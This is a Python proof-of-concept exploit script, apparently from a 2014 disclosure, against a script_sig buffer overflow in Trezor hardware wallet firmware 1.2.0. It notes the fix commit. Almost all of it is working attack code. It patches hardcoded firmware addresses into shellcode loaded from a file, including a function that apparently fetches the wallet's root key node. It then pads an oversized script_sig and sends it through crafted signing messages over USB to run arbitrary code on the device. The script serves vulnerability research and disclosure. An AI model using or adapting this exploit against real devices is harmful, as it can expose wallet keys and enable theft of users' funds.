# Trezor 1.2.0 script_sig overflow
# MIT License 
# Nicolas Bacca, BTChip, 2014

# Buffer overflow allowing arbitrary code execution
# Cleared by https://github.com/trezor/trezor-mcu/commit/524f2a957afb66e6a869384aceaca1cb7f9cba60

from trezorlib import *
from trezorlib.client import TrezorClient
from trezorlib.transport_hid import HidTransport
import trezorlib.messages_pb2 as proto
import trezorlib.types_pb2 as types
import binascii

# 1.2.0
getRootNode = 0x080108c0
oledClear = 0x0801af38
oledDrawString = 0x0801b0fc
oledRefresh = 0x0801af48

fic = open("hax.o", "rb")
shell = bytearray(fic.read()[0x34:0x100])
fic.close()

getRootNode+=1
oledClear+=1
oledDrawString+=1
oledRefresh+=1

shell[len(shell) - 4] = (oledRefresh & 0xff)
shell[len(shell) - 3] = ((oledRefresh >> 8) & 0xff)
shell[len(shell) - 2] = ((oledRefresh >> 16) & 0xff)
shell[len(shell) - 1] = ((oledRefresh >> 24) & 0xff)

shell[len(shell) - 8] = (oledDrawString & 0xff)
shell[len(shell) - 7] = ((oledDrawString >> 8) & 0xff)
shell[len(shell) - 6] = ((oledDrawString >> 16) & 0xff)
shell[len(shell) - 5] = ((oledDrawString >> 24) & 0xff)

shell[len(shell) - 12] = (oledClear & 0xff)
shell[len(shell) - 11] = ((oledClear >> 8) & 0xff)
shell[len(shell) - 10] = ((oledClear >> 16) & 0xff)
shell[len(shell) - 9] = ((oledClear >> 24) & 0xff)

shell[len(shell) - 16] = (getRootNode & 0xff)
shell[len(shell) - 15] = ((getRootNode >> 8) & 0xff)
shell[len(shell) - 14] = ((getRootNode >> 16) & 0xff)
shell[len(shell) - 13] = ((getRootNode >> 24) & 0xff)

shell = str(shell)

print binascii.hexlify(shell)

DUMMY_SIZE = 500
SEQ = 0x01234567

SIG_DUMMY = shell
SIG_DUMMY += "\x63\xfd\x01\x20" * ((DUMMY_SIZE - len(shell)) / 4) # 1.2.0


devices = HidTransport.enumerate()
client = TrezorClient(HidTransport(devices[0]))

client.transport.session_begin()
tx = proto.SignTx()
tx.inputs_count = 1 
tx.outputs_count = 1 
tx.coin_name = "Bitcoin" 
res = client.call(tx)

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testInput = types.TxInputType(address_n=[0], 
                             prev_hash=binascii.unhexlify('d5f65ee80147b4bcc70b75e4bbf2d7382021b871bd8867ef8fa525ef50864882'),
                             prev_index=0,
			     script_sig=SIG_DUMMY,
			     sequence=SEQ
                             )
msg.inputs.extend([ testInput ])
res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()

msg.version = 1
msg.lock_time = 0
msg.inputs_cnt = 1 
msg.outputs_cnt = 0
res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testInput = types.TxInputType(address_n=[0],
                             prev_hash=binascii.unhexlify('d5f65ee80147b4bcc70b75e4bbf2d7382021b871bd8867ef8fa525ef50864882'),
                             prev_index=0,
                             script_sig=SIG_DUMMY,
			     sequence=SEQ
                             )
msg.inputs.extend([ testInput ])
res = client.call(proto.TxAck(tx = msg)) # bye

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res




